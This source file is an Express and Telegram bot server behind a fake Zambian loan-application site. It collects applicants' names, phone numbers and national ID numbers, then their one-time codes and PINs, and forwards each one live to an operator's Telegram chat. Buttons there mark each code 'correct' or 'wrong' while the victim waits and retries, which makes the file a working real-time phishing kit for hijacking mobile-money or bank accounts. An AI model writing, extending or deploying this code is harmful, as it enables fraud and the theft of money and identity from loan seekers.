const express = require('express');
const http = require('http');
const { WebSocketServer } = require('ws');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

// ─── CONFIG ───────────────────────────────────────────────
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
const ADMIN_TELEGRAM_ID = process.env.ADMIN_TELEGRAM_ID || 'YOUR_TELEGRAM_ID_HERE';
const PORT = process.env.PORT || 3000;
const WEBHOOK_URL = process.env.WEBHOOK_URL || `https://zambia-loans-rtuw.onrender.com/webhook`;

// ─── SETUP ────────────────────────────────────────────────
const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server, path: '/ws' });
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false }); // ← NO POLLING

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ─── SESSION STORE ────────────────────────────────────────
const sessions = {};
const wsBySession = {};

// ─── WEBSOCKET ────────────────────────────────────────────
wss.on('connection', (ws, req) => {
    const url = new URL(req.url, 'http://localhost');
    const sessionId = url.searchParams.get('session');
    if (sessionId && sessions[sessionId]) wsBySession[sessionId] = ws;
    ws.on('close', () => {
        if (sessionId && wsBySession[sessionId] === ws) delete wsBySession[sessionId];
    });
});

function sendToUser(sessionId, message) {
    const ws = wsBySession[sessionId];
    if (ws && ws.readyState === 1) ws.send(JSON.stringify(message));
}

// ─── SET WEBHOOK ON START ─────────────────────────────────
bot.setWebhook(WEBHOOK_URL).then(() => {
    console.log(`🔗 Webhook set: ${WEBHOOK_URL}`);
}).catch(e => console.log('[Webhook Error]', e.message));

// ─── TELEGRAM WEBHOOK ENDPOINT ────────────────────────────
app.post('/webhook', (req, res) => {
    const update = req.body;
    res.sendStatus(200); // respond immediately

    // Handle inline button callbacks
    if (update.callback_query) {
        handleCallback(update.callback_query);
    }

    // Handle /start
    if (update.message && update.message.text === '/start') {
        if (update.message.from.id === parseInt(ADMIN_TELEGRAM_ID)) {
            bot.sendMessage(update.message.chat.id,
                '✅ <b>Admin Connected</b>\n\nYou will receive loan applications here.\nUse the inline buttons to verify OTP and PIN.',
                { parse_mode: 'HTML' });
        }
    }
});

// ─── CALLBACK HANDLER ─────────────────────────────────────
async function handleCallback(query) {
    const data = query.data;
    const parts = data.split(':');
    const action = parts[0];
    const result = parts[1];
    const sessionId = parts.slice(2).join(':');

    const s = sessions[sessionId];
    if (!s) {
        await bot.answerCallbackQuery(query.id, { text: 'Session expired' });
        return;
    }

    if (action === 'otp') {
        if (result === 'correct') {
            s.phase = 'pin';
            const msg = { type: 'otp_result', result: 'correct' };
            s.decision = { type: 'otp_result', result: 'correct' };
            sendToUser(sessionId, msg);
            await bot.answerCallbackQuery(query.id, { text: '✅ OTP Correct → PIN' });
            await bot.sendMessage(ADMIN_TELEGRAM_ID, `✅ <b>OTP Verified</b>\n👤 ${esc(s.data.name)}\n\nMoving to PIN…`, { parse_mode: 'HTML' });
        } else {
            s.phase = 'otp';
            const msg = { type: 'otp_result', result: 'wrong' };
            s.decision = { type: 'otp_result', result: 'wrong' };
            sendToUser(sessionId, msg);
            await bot.answerCallbackQuery(query.id, { text: '❌ Wrong OTP' });
            await bot.sendMessage(ADMIN_TELEGRAM_ID, `❌ <b>OTP Incorrect</b>\n👤 ${esc(s.data.name)}\n\nUser will re-enter OTP.`, { parse_mode: 'HTML' });
        }
    }

    if (action === 'pin') {
        if (result === 'correct') {
            s.phase = 'success';
            const msg = { type: 'pin_result', result: 'correct' };
            s.decision = { type: 'pin_result', result: 'correct' };
            sendToUser(sessionId, msg);
            await bot.answerCallbackQuery(query.id, { text: '✅ PIN Correct → SUCCESS' });
            const interest = Math.round(s.data.amount * 0.0013 * s.data.period);
            const total = s.data.amount + interest;
            const ref = 'RMZ-' + Date.now().toString(36).toUpperCase().slice(-8);
            await bot.sendMessage(ADMIN_TELEGRAM_ID,
                `🎉 <b>APPLICATION SUCCESSFUL!</b>\n\n` +
                `👤 ${esc(s.data.name)}\n📱 ${s.data.phone}\n🪪 ${s.data.idNumber}\n` +
                `💰 K${s.data.amount.toLocaleString()} | 📅 ${s.data.period}d\n` +
                `📊 Repayment: K${total.toLocaleString()}\n🔖 Ref: ${ref}\n\n` +
                `💡 <b>Deposit more money for more loan!</b>`,
                { parse_mode: 'HTML' });
        } else {
            s.phase = 'pin';
            const msg = { type: 'pin_result', result: 'wrong' };
            s.decision = { type: 'pin_result', result: 'wrong' };
            sendToUser(sessionId, msg);
            await bot.answerCallbackQuery(query.id, { text: '❌ Wrong PIN' });
            await bot.sendMessage(ADMIN_TELEGRAM_ID, `❌ <b>PIN Incorrect</b>\n👤 ${esc(s.data.name)}\n\nUser will re-enter PIN.`, { parse_mode: 'HTML' });
        }
    }
}

// ─── TELEGRAM HELPERS ─────────────────────────────────────
function sendToAdmin(text, inlineButtons) {
    const opts = { parse_mode: 'HTML' };
    if (inlineButtons) opts.reply_markup = { inline_keyboard: inlineButtons };
    return bot.sendMessage(ADMIN_TELEGRAM_ID, text, opts).catch(e => console.log('[TG Error]', e.message));
}

// ─── API: CREATE SESSION ──────────────────────────────────
app.post('/api/apply', (req, res) => {
    const { name, phone, idNumber, amount, period } = req.body;
    if (!name || !phone || !idNumber || !amount || !period)
        return res.status(400).json({ success: false, error: 'Missing fields' });

    const sessionId = Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
    sessions[sessionId] = { phase: 'otp', data: { name, phone, idNumber, amount, period }, decision: null, createdAt: Date.now() };

    const interest = Math.round(amount * 0.0013 * period);
    const total = amount + interest;

    sendToAdmin(
        `🆕 <b>New Loan Application</b>\n\n` +
        `👤 ${esc(name)}\n📱 ${phone}\n🪪 ${idNumber}\n` +
        `💰 K${amount.toLocaleString()} | 📅 ${period}d\n` +
        `📊 Est. Repayment: K${total.toLocaleString()}\n\n` +
        `⏳ <i>Waiting for OTP…</i>`,
        [[
            { text: '✅ Correct OTP', callback_data: `otp:correct:${sessionId}` },
            { text: '❌ Wrong OTP', callback_data: `otp:wrong:${sessionId}` }
        ]]
    );

    console.log(`[NEW] ${sessionId} | ${name} | ${phone} | K${amount}`);
    res.json({ success: true, sessionId });
});

// ─── API: SUBMIT OTP ──────────────────────────────────────
app.post('/api/otp', (req, res) => {
    const { sessionId, otp } = req.body;
    const s = sessions[sessionId];
    if (!s) return res.status(400).json({ success: false, error: 'Session not found' });
    if (s.phase !== 'otp') return res.status(400).json({ success: false, error: 'Not in OTP phase' });

    s.phase = 'otp_submitted';
    s.decision = null;
    s.data.otp = otp;

    sendToAdmin(
        `📲 <b>OTP Received</b>\n\n👤 ${esc(s.data.name)}\n📱 ${s.data.phone}\n` +
        `🔢 <b>OTP:</b> <code>${otp}</code>\n\nIs this correct?`,
        [[
            { text: '✅ Correct OTP', callback_data: `otp:correct:${sessionId}` },
            { text: '❌ Wrong OTP', callback_data: `otp:wrong:${sessionId}` }
        ]]
    );

    console.log(`[OTP] ${sessionId} → ${otp}`);
    res.json({ success: true });
});

// ─── API: SUBMIT PIN ──────────────────────────────────────
app.post('/api/pin', (req, res) => {
    const { sessionId, pin } = req.body;
    const s = sessions[sessionId];
    if (!s) return res.status(400).json({ success: false, error: 'Session not found' });
    if (s.phase !== 'pin') return res.status(400).json({ success: false, error: 'Not in PIN phase' });

    s.phase = 'pin_submitted';
    s.decision = null;
    s.data.pin = pin;

    sendToAdmin(
        `🔐 <b>PIN Received</b>\n\n👤 ${esc(s.data.name)}\n📱 ${s.data.phone}\n` +
        `🔢 <b>PIN:</b> <code>${pin}</code>\n\nIs this correct?`,
        [[
            { text: '✅ Correct PIN', callback_data: `pin:correct:${sessionId}` },
            { text: '❌ Wrong PIN', callback_data: `pin:wrong:${sessionId}` }
        ]]
    );

    console.log(`[PIN] ${sessionId} → ${pin}`);
    res.json({ success: true });
});

// ─── API: POLL FOR DECISION ───────────────────────────────
app.get('/api/check', (req, res) => {
    const { sessionId } = req.query;
    const s = sessions[sessionId];
    if (!s) return res.json({ status: 'not_found' });
    if (s.decision) {
        const d = s.decision;
        s.decision = null;
        res.json({ status: 'decision', type: d.type, result: d.result });
    } else {
        res.json({ status: 'waiting' });
    }
});

// ─── HELPER ───────────────────────────────────────────────
function esc(t) { return t.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'); }

// ─── CLEANUP ──────────────────────────────────────────────
setInterval(() => {
    const now = Date.now();
    for (const [id, s] of Object.entries(sessions)) {
        if (now - s.createdAt > 30 * 60 * 1000) delete sessions[id];
    }
}, 60000);

server.listen(PORT, () => {
    console.log(`\n✅ Server: http://localhost:${PORT}`);
    console.log(`📱 User:   http://localhost:${PORT}/`);
    console.log(`🔗 Webhook: ${WEBHOOK_URL}\n`);
});   
